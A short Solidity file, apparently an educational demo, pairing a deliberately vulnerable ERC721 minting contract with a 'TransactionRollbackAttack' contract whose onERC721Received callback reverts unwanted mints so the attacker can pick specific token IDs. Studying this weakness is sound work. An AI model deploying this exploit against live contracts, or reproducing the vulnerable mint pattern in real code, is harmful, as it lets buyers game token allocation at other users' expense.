//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

interface INFT {
    function buyNFT() external payable;
}

contract NFT is ERC721 {
    uint256 tokenId;

    constructor() ERC721("NFT","NFT") {}

    function buyNFT() external payable {
        require(msg.value >= 1 ether, "NFT: You must pay 1 ether to buy an NFT");
        _safeMint(msg.sender, tokenId++);
    }
}

contract TransactionRollbackAttack {
    INFT nft;
    uint256 tokenId;

    constructor(address _nft) {
        nft = INFT(_nft);
    }

    function doBuyNFT(uint256 _tokenId) external payable {
        tokenId = _tokenId;
        nft.buyNFT{value: msg.value}();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 _tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        require(tokenId == _tokenId, "NFT: not the correct token");
        return this.onERC721Received.selector;
    }
}
